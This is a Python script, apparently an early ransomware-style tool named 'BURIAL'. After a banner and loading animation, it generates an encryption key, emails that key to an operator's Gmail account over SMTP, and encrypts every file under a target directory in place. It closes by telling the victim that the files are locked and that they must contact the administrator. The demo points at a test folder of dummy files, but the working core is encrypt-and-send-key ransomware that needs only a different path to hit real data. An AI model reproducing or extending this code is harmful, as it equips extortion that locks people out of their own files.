#this is our first version of the BURIAL project. Please keep in mind of bugs, errors and note that there might be risks in decrypting your files.
#please also note that some set-up is required. Full guide will be available soon.
#file is still undergoing progress. Do not try to use this as errors may occur.

import time
import sys
import os

GREEN =  "\033[32m"
YELLOW = "\033[33m"
RESET = "\033[0m"
UNDERLINE = "\033[4m"
BOLD = "\033[1m"

print(f"[+] Do not use the program yet! We are currently under developement.")
time.sleep(2)
print(f"[+] We thank you for your patience. The program will release soon...")
time.sleep(1.8)
print(f"[+] Best regards, --+--+--THE BURIAL PROGRAM--+--+--")
time.sleep(3)
print("===============================================================================================")

# Ask the user if they want to run the tool
run_tool = input(f"{YELLOW}[-] Do you want to run the tool anyways? (y/n): {RESET}").strip().lower()

if run_tool != 'y':
    print("[-] Exiting...")
    time.sleep(2.6)
    exit()

# Warn the user about potential flaws
continue_tool = input(f"{YELLOW}[-] Our tool is not ready and has possible flaws, continue at your own risk. Do you wish to continue? (y/n): {RESET}").strip().lower()

if continue_tool != 'y':
    print("[-] Exiting...")
    exit()

# If the user agrees to continue, start the tool
print("[+] Starting the tool...")
time.sleep(1.9)
#

def clear_screen():
    """Clear the terminal screen."""
    if sys.platform == 'win32':
        os.system('cls')  # For Windows
    else:
        os.system('clear')  # For Unix-like systems (Linux, macOS)

clear_screen()

print("============================================================================================================================")
print("                                                                   ")
print("                                                                   ")
print(f"{GREEN}                                                  _                       ")
print(f"{GREEN}         ______                ______     |_|    ____              ")
print(f"{GREEN}        |      \\  |       |   /      \\     _    /    \\   |         ")
print(f"{GREEN}               |      |  |       |  |        |   | |  |      |  |         ")
print(f"{GREEN}               |_____/   |       |  |_______/    | |  |______|  |         ")
print(f"{GREEN}               |     \\   |       |  |       \\    | |  |      |  |         ")
print(f"{GREEN}               |      \\  |       |  |        \\   | |  |      |  |         ")
print(f"{GREEN}               |      |  |       |  |        |   | |  |      |  |         ")
print(f"{GREEN}               |______/   \\______/  |        |   |_|  |      |  |______   ")
print(f"{GREEN}                                                                  ")
print(f"{YELLOW}                                                {UNDERLINE}v.1.0.1.  -  pre-release{RESET}")
print(f"{YELLOW}                                                {UNDERLINE}made by TheUntracable{RESET}")
time.sleep(7)
print("         ")
time.sleep(0.6)
print(f"              -- [+] \033[4mSTARTING UP MACHINE   -   v.1.0.1 pre-release\033[0m [+] -- ")
time.sleep(5)


sequence = ["\\", "-", "/", "|", "\\", "-", "/", "|"]
duration = 12.7
start_time = time.time()
while time.time() - start_time < duration:
    for char in sequence:
        sys.stdout.write(f"\rLoading... {char}")
        sys.stdout.flush()
        time.sleep(0.22)
print("\nLoading complete!")
print("===============================================================================================")

RED = "\033[31m"
GREEN = "\033[32m"
YELLOW = "\033[33m"
BLUE = "\033[34m"
MAGENTA = "\033[35m"
CYAN = "\033[36m"
RESET = "\033[0m"
BOLD = "\033[1m"
UNDERLINE = "\033[4m"
RESET = "\033[0m"

import os
import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from cryptography.fernet import Fernet

# Function to generate a key for encryption/decryption
def generate_key():
    return Fernet.generate_key()

# Function to encrypt files in a directory
def encrypt_files(directory, key):
    fernet = Fernet(key)
    for root, _, files in os.walk(directory):
        for file in files:
            file_path = os.path.join(root, file)
            with open(file_path, "rb") as f:
                data = f.read()
            encrypted_data = fernet.encrypt(data)
            with open(file_path, "wb") as f:
                f.write(encrypted_data)
    print(f"{GREEN}[+] Files in {directory} have been locked.{RESET}")

# Function to send the key via email
def send_key_via_email(key, recipient_email, sender_email, sender_password):
    try:
        # Creates the email
        subject = "File Locker Key"
        body = f"The key to unlock the files is: {key.decode()}"
        msg = MIMEMultipart()
        msg['From'] = sender_email
        msg['To'] = recipient_email
        msg['Subject'] = subject
        msg.attach(MIMEText(body, 'plain'))

        # Sends the email
        with smtplib.SMTP('smtp.gmail.com', 587) as server:  # Use Gmail's SMTP server
            server.starttls()
            server.login(sender_email, sender_password)
            server.sendmail(sender_email, recipient_email, msg.as_string())
        time.sleep(2.3)
        print(f"{GREEN}[+] Key sent to your email.")
    except Exception as e:
        print(f"{RED}[+] We failed to send the key to your email: {e}")

# Main function
def main():
    # Defines the directory to lock/unlock (uses a test directory, not critical system files)
    target_directory = "test_files"  # Replace with a safe directory for testing

    # Ensures the target directory exists
    if not os.path.exists(target_directory):
        print(f"{YELLOW}[+] Creating test directory: {target_directory}")
        os.makedirs(target_directory)
        # Creates some dummy files for testing
        for i in range(3):
            with open(os.path.join(target_directory, f"test_file_{i}.txt"), "w") as f:
                f.write(f"This is a test file #{i}.")

    time.sleep(2)
    # Generates a key for encryption/decryption
    key = generate_key()
    time.sleep(2.5)
    print(f"{GREEN}[+] Key generated.{RESET}")
    # Send the key to your email
    sender_email = "your-email@gmail.com"  # Replace with your email
    sender_password = "xxxx xxxx xxxx"  # Replace with your email password (16 characters)
    recipient_email = "your-email@gmail.com"  # Replace with your email
    send_key_via_email(key, recipient_email, sender_email, sender_password)

    # Simulates locking files
    time.sleep(2)
    print(f"{YELLOW}[+] Simulating file locking...")
    encrypt_files(target_directory, key)
    time.sleep(2)
    print(f"{GREEN}[+] Files locked.{RESET}")
    print(f"{RED}                    ==========----------{UNDERLINE}BURIAL SUCCESFULL{RESET}{RED}---------=========={RESET}")
    time.sleep(4.8)
    # Display a message to the user
    print(f"{GREEN}[+] Your files have been succesfully locked. Contact the administrator to unlock them.{RESET}")
    print("===============================================================================================")
    print(f"{YELLOW}[+] If you wish to contact the administrator, run the 'contact_administrator.py file.{RESET}")
    print(f"{YELLOW}[+] !important! DO NOT FORGET TO RUN {UNDERLINE}'reset.py'{RESET}{YELLOW} BEFORE RUNNING THIS TOOL AGAIN!!!{RESET}")
    print("             ")
    print("             ")
    print("             ")
if __name__ == "__main__":
    main()
